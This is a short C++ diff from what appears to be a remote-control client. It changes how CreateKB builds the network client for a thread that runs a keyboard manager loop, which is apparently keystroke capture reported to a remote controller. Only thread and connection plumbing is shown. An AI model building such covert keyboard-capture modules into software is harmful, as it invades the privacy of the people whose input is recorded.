@@ -28,7 +28,7 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_di
 ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
 	static ThreadInfo tKeyboard;
 	tKeyboard.run = FOREVER_RUN;
-	tKeyboard.p = NewNetClient(conn, bExit, false);
+	tKeyboard.p = new IOCPClient(bExit, false);
 	tKeyboard.conn = conn;
 	tKeyboard.h = (HANDLE)CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
 	return &tKeyboard;
